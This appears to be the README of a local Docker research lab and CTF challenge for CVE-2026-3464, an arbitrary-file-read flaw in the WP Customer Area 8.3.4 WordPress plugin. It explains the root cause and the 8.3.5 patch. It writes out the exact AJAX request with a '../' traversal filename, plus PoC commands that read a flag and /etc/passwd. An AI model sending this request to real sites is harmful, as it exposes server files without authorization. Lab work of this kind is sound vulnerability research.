# CVE-2026-3464: WP Customer Area 8.3.4 local lab
# This is a SOURCELESS chall

This repository is a self-contained, loopback-only WordPress research lab and small CTF challenge for the arbitrary-file-**read** impact of CVE-2026-3464. It intentionally does not implement the deletion variant.

## Architecture

`docker-compose.yml` runs three pinned official images:

- `wordpress:6.7.2-php8.2-apache` serves WordPress on `127.0.0.1:8080` only. Its entrypoint creates `/opt/flag.txt` outside `/var/www/html`.
- `mariadb:11.4.5` stores WordPress data on the internal Compose network and publishes no host port.
- `wordpress:cli-2.11.0-php8.2` installs WordPress, downloads and checksum-verifies WP Customer Area 8.3.4, creates the users/content, and then exits.

The `wp_data` volume is shared by WordPress and the one-shot CLI bootstrap. The database has its own volume. The only published socket is the WordPress loopback port.

## Credentials

| Account | Password | Access |
|---|---|---|
| `admin` | `admin-local-only` | WordPress administrator |
| `customer` | `customer-local-only` | Custom `Customer Area Player` role |

The player role has WordPress `read` plus Customer Area `cuar_pf_edit` and `cuar_pf_read`. It does **not** have `cuar_pf_manage_attachments`, `cuar_pf_list_all`, `cuar_pf_delete`, `manage_options`, WordPress `edit_posts`, Editor, or Administrator privileges. `cuar_pf_edit` opens the ordinary edit screen for the player's seeded private-file post, and `cuar_pf_read` is the post type's read capability. The AJAX handler itself accepts the post author without `cuar_pf_manage_attachments`, so the player owns the seeded post. The plugin's optional global admin-area restriction remains disabled; no broad admin-access capability is added.

## Verified root cause

The analysis below was made from the official WordPress.org 8.3.4 and 8.3.5 ZIPs. The lab pins the 8.3.4 archive SHA-256 to:

```text
f6f1bedef8e98ecc1b351cd4659bf8a5321dffe7c0696c65c0c6ded0b122e74b
```

The vulnerable endpoint is authenticated WordPress AJAX action `cuar_attach_file`, registered as `wp_ajax_cuar_attach_file`, and implemented by `CUAR_PrivateFileAddOn::ajax_attach_file()` in:

```text
src/php/core-addons/private-file/private-file-addon.class.php:844
```

The exact request used by this lab is a form-encoded `POST /wp-admin/admin-ajax.php` containing:

```text
action=cuar_attach_file
method=ftp-folder
post_id=<player-owned cuar_private_file ID>
filename=../../../../../../opt/flag.txt
caption=flag.txt
extra=ftp-copy
cuar_ftp-folder_<post_id>=<nonce>
```

The nonce action is `cuar-attach-ftp-folder-<post_id>`, and its request-field name is `cuar_ftp-folder_<post_id>`. It is emitted by the plugin's normal attachment metabox. Authentication is mandatory despite the plugin also registering a `nopriv` hook: the function explicitly calls `is_user_logged_in()` and requires either post authorship or `cuar_pf_manage_attachments`. A second ownership check also passes for the author.

The request data flow is:

```text
authenticated author of a Customer Area private-file post
        ↓
POST action=cuar_attach_file, method=ftp-folder
        ↓
$_POST['filename'] becomes $initial_filename
        ↓
attach_ftp_file() builds get_ftp_path() . '/' . $initial_filename
        ↓
8.3.4 performs no basename/realpath containment check
        ↓
../../../../../../opt/flag.txt escapes wp-content/customer-area/ftp-uploads
        ↓
copy() places the file in the post's protected attachment directory
        ↓
the normal authenticated private-file download action streams it
        ↓
CTF{customer_area_path_escape}
```

There is a subtle but important two-name behavior. The `unique_local_filename()` filter runs the attacker value through WordPress `wp_unique_filename()`, producing the safe destination/metadata name `flag.txt`. In 8.3.4, however, `CUAR_PrivateFileDefaultHandlers::attach_ftp_file()` still constructs its **source** from the original unsanitized `$initial_filename`. Thus sanitizing the destination does not constrain what `copy()` reads.

The contents become observable because `ajax_attach_file()` records the copied file using `add_attached_file()`. A subsequent normal private-file request with `cuar_action=download` and the returned file ID reaches `handle_file_actions()`, confirms ownership, and dispatches the local handler. `output_local_file()` calls `output_file()`, which opens and streams the copied bytes to the authenticated user.

Relevant upstream references: [8.3.4 vulnerable handler](https://plugins.trac.wordpress.org/browser/customer-area/tags/8.3.4/src/php/core-addons/private-file/private-file-default-handlers.class.php#L404), [8.3.4 AJAX handler](https://plugins.trac.wordpress.org/browser/customer-area/tags/8.3.4/src/php/core-addons/private-file/private-file-addon.class.php#L844), and [upstream patch changeset](https://plugins.trac.wordpress.org/changeset/3507868/customer-area).

## 8.3.5 patch analysis

Version 8.3.5 changes `attach_ftp_file()` before the copy:

- converts the input to a string and rejects an empty value, NUL, any `/` or `\\`, and any value for which `basename($initial_filename) !== $initial_filename`;
- resolves both the configured FTP folder and source with `realpath()`;
- normalizes both paths and requires the source path to begin with the canonical FTP-folder path;
- requires the source to be a readable regular file;
- copies (and, for the separate move feature, unlinks) only the canonical `$src_real` path.

Those checks prevent `..` traversal, platform-specific separators, NUL tricks, nonexistent paths, and symlinks resolving outside the intended folder. This is the exact 8.3.4-to-8.3.5 change in the official archives, not an inferred mitigation.

## Running

Copy the environment example if you want to customize values, then start the lab:

```bash
cp .env.example .env
docker compose up -d
docker compose logs -f cli
```

Older Docker installations with standalone Compose can use `docker-compose`; the Makefile and scripts detect either form. Wait for `Lab initialization complete`, then browse to <http://127.0.0.1:8080>.

If the historical download is unavailable, place the legitimate archive at `vendor/wp-customer-area.8.3.4.zip`. Bootstrap applies the same pinned checksum and never falls back to another version.

Useful commands:

```bash
make up
make logs
make verify
make solve
make reset
make down
```

## Testing and solving

Install the only host-side Python dependency if necessary:

```bash
python3 -m pip install -r poc/requirements.txt
python3 poc/exploit.py
```

or simply:

```bash
make solve
```

Expected output:

```text
CTF{customer_area_path_escape}
```

The PoC logs in, discovers editable private-file posts through ordinary WordPress pages, extracts the plugin-generated nonce from the real edit form, invokes the vulnerable AJAX action, then follows the real Customer Area attachment link. Repeated runs reuse the previously created flag attachment instead of failing the attachment-count check or deleting content. If a post is not discoverable in the portal or normal private-file listing, pass `--post-id ID` (repeat the option for multiple posts). It never reads Docker volumes or a helper endpoint. It accepts only `localhost`, `127.0.0.1`, or `::1`, verifies that every DNS result is loopback, and revalidates each redirect.

`make verify` checks HTTP reachability, exact plugin version, user/capability boundaries, flag readability inside the container, and lack of direct HTTP access to `/opt/flag.txt`.

### Publishable `/etc/passwd` demonstration

`poc/github_poc_etc_passwd.py` is a second, fixed-purpose demonstration suitable for publishing with this local lab. It uses the same CVE path but reads `/etc/passwd` and prints the returned file. It does not accept arbitrary paths and retains the loopback-only target and redirect checks:

```bash
python3 poc/github_poc_etc_passwd.py --target http://127.0.0.1:8080
```

The challenge permits one attachment per post. Reset first when switching between the flag and `/etc/passwd` demonstrations; repeat runs of the same demonstration reuse its existing attachment.

## Resetting

`make reset` removes attachments from the seeded challenge post through an administrative WP-CLI reset script, restores the sample FTP-folder content, and resets the development player password/content. It does not exercise the vulnerable deletion primitive.

For a clean rebuild from empty volumes:

```bash
docker compose down -v --remove-orphans
docker compose up -d
```

`make clean && make up` is equivalent.

## CTF deployment notes

- Supply the real flag as an environment secret (`CTF_FLAG`) and never commit it.
- Remove `poc/` from the player-facing release.
- Replace both development passwords.
- Expose the instance only through controlled CTF infrastructure; keep MariaDB and internal services private.
- Prefer an isolated instance per team.
- Retain the loopback binding for local research. If challenge infrastructure must proxy it, explicitly design that network boundary rather than broadly publishing the container port.

The helper PHP files only seed/reset users and posts. They are mounted into the CLI container, are not web-accessible, and contain no file-read endpoint. The vulnerable behavior is entirely WP Customer Area 8.3.4.
